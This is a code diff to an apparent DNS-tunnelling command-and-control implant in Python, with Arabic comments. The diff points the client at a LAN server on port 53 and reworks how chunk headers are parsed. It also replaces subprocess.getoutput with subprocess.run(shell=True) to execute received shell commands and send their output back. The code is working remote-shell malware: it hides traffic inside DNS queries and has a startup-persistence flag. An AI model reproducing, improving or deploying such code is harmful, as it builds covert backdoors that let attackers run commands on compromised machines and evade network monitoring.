@@ -16,7 +16,7 @@ byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
 target_pub_key = None
 CHUNK_SIZE = 36 # تم التعديل ليتناسب مع CVC (30 data + 6 header)
 IS_ADDED_TO_STARTUP = False
-SERVER = ("127.0.0.1", 27381)
+SERVER = ("192.168.1.35", 53)
 sent_chunks = {}
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 last_received_time = None
@@ -35,9 +35,9 @@ except Exception as e:
 def send_raw(payload_text):
     try:
         chunks = dns_message(payload_text, CHUNK_SIZE)
-        for chunk in chunks:
-            # jitter_delay = 0.3 + random.uniform(-0.3, 0.3)
-            # time.sleep(jitter_delay)
+        print(f"[SEND_RAW DEBUG] Got {len(chunks)} chunks to send")
+        for i, chunk in enumerate(chunks):
+            print(f"[SEND_RAW DEBUG] Sending chunk {i}")
             sock.sendto(chunk, SERVER)
     except Exception as e:
         print(e)
@@ -59,14 +59,15 @@ def send_msg(message, is_cached: bool):
             return
         
         chunks = dns_message(encrypted_bytes, 36)
+        print(f"[SEND_MSG DEBUG] Got {len(chunks)} chunks to send")
 
         sent_chunks = {}
         i = 0
         for chunk in chunks:
             if is_cached:
                 sent_chunks[i] = chunk
-                # jitter_delay = 0.003 + random.uniform(-0.002, 0.002)
-                # time.sleep(jitter_delay)
+            print(f"[SEND_MSG DEBUG] Sending chunk {i}")
+            time.sleep(0.01)  # 10ms between packets
             sock.sendto(chunk, SERVER)
             i += 1
     except Exception as e:
@@ -147,25 +148,27 @@ def core():
             # قبول الاستعلامات والردود
             if dns_request.header.qr == 0 or dns_request.header.qr == 1:
                 
-                # 1. استخراج اسم الدومين كاملاً
+                # 1. استخراج Session ID من DNS Transaction ID
+                session_id = dns_request.header.id
+                
+                # 2. استخراج اسم الدومين كاملاً
                 query_name = str(dns_request.q.qname).rstrip('.')
                 
-                # 2. فك تشفير CVC (تحويل الدومين إلى بايتات خام)
-                # هذه الخطوة تستبدل كل منطق split('.') القديم
+                # 3. فك تشفير CVC (تحويل الدومين إلى بايتات خام)
                 raw_packet_bytes = cvc_codec.decode_domain_to_bytes(query_name)
                 
-                # إذا فشل فك التشفير أو كانت البيانات قصيرة جداً (أقل من الهيدر 6 بايت)
-                if not raw_packet_bytes or len(raw_packet_bytes) < 6:
+                # إذا فشل فك التشفير أو كانت البيانات قصيرة جداً (أقل من الهيدر 4 بايت)
+                if not raw_packet_bytes or len(raw_packet_bytes) < 4:
                     continue
 
-                # 3. قراءة الهيدر الثنائي (Binary Header Extraction)
-                # الهيدر: SessionID (2) | Index (2) | Total (2) = 6 bytes
+                # 4. قراءة الهيدر الثنائي (Binary Header Extraction)
+                # الهيدر: Index (2) | Total (2) = 4 bytes (Session ID is in DNS header)
                 try:
-                    header_bytes = raw_packet_bytes[:6]
-                    chunk_data = raw_packet_bytes[6:] # باقي الباكت هو الداتا
+                    header_bytes = raw_packet_bytes[:4]
+                    chunk_data = raw_packet_bytes[4:]  # باقي الباكت هو الداتا
                     
                     # فك ضغط الهيدر
-                    session_id, index, total = struct.unpack('!HHH', header_bytes)
+                    index, total = struct.unpack('!HH', header_bytes)
                 except struct.error:
                     continue
 
@@ -260,9 +263,20 @@ def core():
                                 # تنفيذ أمر الشل
                                 try:
                                     print(f"[>] Executing: {full_command}")
-                                    # تنفيذ الأمر
-                                    response = subprocess.getoutput(full_command)
+                                    # تنفيذ الأمر مع معالجة الترميز
+                                    result = subprocess.run(
+                                        full_command,
+                                        shell=True,
+                                        capture_output=True,
+                                        timeout=60
+                                    )
+                                    # دمج stdout و stderr كـ bytes ثم فك الترميز
+                                    output_bytes = result.stdout + result.stderr
+                                    response = output_bytes.decode('utf-8', errors='replace')
                                     print(f"[<] Response length: {len(response)} chars")
+                                except subprocess.TimeoutExpired:
+                                    print(f"[!] Command timed out")
+                                    response = "Command timed out after 60 seconds"
                                 except Exception as exec_err:
                                     print(f"[!] Exec error: {exec_err}")
                                     response = str(exec_err)
